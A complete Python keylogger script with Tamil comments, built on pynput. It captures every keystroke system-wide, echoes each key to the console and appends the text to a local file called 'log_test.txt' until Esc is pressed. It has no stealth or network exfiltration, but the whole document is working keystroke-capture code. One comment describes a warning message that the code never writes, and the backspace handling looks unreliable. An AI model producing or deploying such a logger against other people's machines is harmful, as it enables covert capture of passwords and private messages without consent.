import pynput
from pynput.keyboard import Key, Listener
import os

# விசைப்பலகை பதிவீட்டுக்கான மாறிலிகள்
count = 0
keys = []
log_file = "log_test.txt"

# கோப்பை திறக்கும் போது எச்சரிக்கை செய்தியை எழுதும் செயல்பாடு
def initialize_log_file():
    file_exists = os.path.isfile(log_file)
    with open(log_file, "a") as f:
        if file_exists:
            f.write("\n--- Next session starts here ---\n")

# விசைகள் அழுத்தப்பட்டதை கண்டுபிடிக்கும் செயல்பாடு
def on_press(key):
    global count, keys

    keys.append(key)
    count += 1
    print(f'Key pressed: {key}')  # சரியான தகவலை வெளியிடும்

    if count >= 1:
        write_file(keys)
        keys = [] 
        count = 0

# எழுத்துகளை ஒரு கோப்பில் எழுதும் செயல்பாடு
def write_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")

            if k == "Key.space":
                f.write(' ')
            elif k == "Key.enter":
                f.write('\n')
            elif k == "Key.backspace":
                f.seek(f.tell() - 1, os.SEEK_SET)  # பின்வாங்கி எழுதும் இடத்தை மாற்றம் செய்க
                f.truncate()
            elif "Key" not in k:
                f.write(k)

# ஒரு விசை விடப்பட்ட போது கண்டுபிடி
def on_release(key):
    if key == Key.esc:
        return False

# விசைகள் அழுத்தப்பட்டதை கேட்டு தொடங்குங்கள்
with Listener(on_press=on_press, on_release=on_release) as listener:
    initialize_log_file()
    listener.join()
